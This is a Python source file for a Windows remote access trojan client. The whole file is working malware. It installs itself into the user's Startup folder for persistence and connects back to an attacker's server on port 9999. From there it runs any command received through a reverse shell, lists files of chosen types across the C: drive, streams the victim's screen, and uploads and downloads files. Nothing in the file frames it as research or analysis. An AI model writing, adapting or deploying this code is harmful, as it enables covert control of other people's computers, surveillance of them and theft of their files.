import socket
from threading import Thread
import os
from getpass import getuser
import subprocess
from vidstream import ScreenShareClient
import shutil
try:
    user = getuser()
    dest = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    source = os.path.join(os.getcwd(), '')#enter filename
    shutil.copy(source, dest)
except:
    pass
IPADDR = ''#enter your server/public ip address
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect((IPADDR, PORT))
def connect():
    while True:
        try:
            s.connect((IPADDR, PORT))
            break
        except ConnectionRefusedError:
            continue
        except TimeoutError:
            continue
connect()



extensions = ['.txt', '.docx', '.jpg', '.py']
def listfiles():
    all_files = []
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            root, ext = os.path.splitext(file)

            if ext in extensions:
                s.send(str.encode(file))
                all_files.append(file)
            else:
                pass

    done = '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
    s.send(str.encode(done))

def streamdisplay():
    sendstream = ScreenShareClient(IPADDR, 1235)
    t = Thread(target=sendstream.start_stream, daemon=1)
    t.start()


def sendfile():
    filepath = s.recv(20480).decode('utf-8')#b
    print(filepath)
    completed = b''
    size = int(s.recv(1024).decode('utf-8'))#c
    print(size)
    dirpath = f"C:\\Users\\{getuser()}\\User Boot"

    if os.path.exists(dirpath):
        pass
    else:
        os.mkdir(dirpath)

    head, tail = os.path.split(filepath)

    with open(f'{dirpath}\\{tail}', 'wb') as f:

        while size != len(completed):
            contents = s.recv(2048)#d
            completed += contents

        f.write(completed)

    print('file transfer done')

def getfile():
    while True:
        filepath = s.recv(2048)#b
        size = str(os.path.getsize(filepath))
        print(size)
        input()
        s.send(str.encode(size))
        print('eeee')
        with open(filepath, 'rb') as f:
            contents = f.read()
        s.sendall(contents)
        break


def reverseshell():
    cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    outputbytes = cmd.stdout.read() + cmd.stderr.read()
    outputstr = str(outputbytes, 'utf-8')
    s.send(str.encode(outputstr + str(os.getcwd()) + '>'))
    print(outputstr)


while True:
    data = s.recv(1024)

    if data[:2].decode('utf-8') == 'cd':
        try:    
            os.chdir(data[3:].decode('utf-8'))

        except:
            pass

    if len(data) > 0 and data.decode('utf-8') != r'//////SENDFILE//////' and data.decode('utf-8') != r"//////LISTFILES//////" and data.decode('utf-8') != r"//////STREAMDISPLAY//////" and data.decode('utf-8') != r"//////GETFILE//////":
        reverseshell()

    if data.decode('utf-8') == r"//////LISTFILES//////":
        listfiles()

    if data.decode('utf-8') == r"//////STREAMDISPLAY//////":
        streamdisplay()

    if data.decode('utf-8') == r'//////SENDFILE//////':#a
        sendfile()

    if data.decode('utf-8') == r"//////GETFILE//////":#a
        getfile()
    else:
        reverseshell()

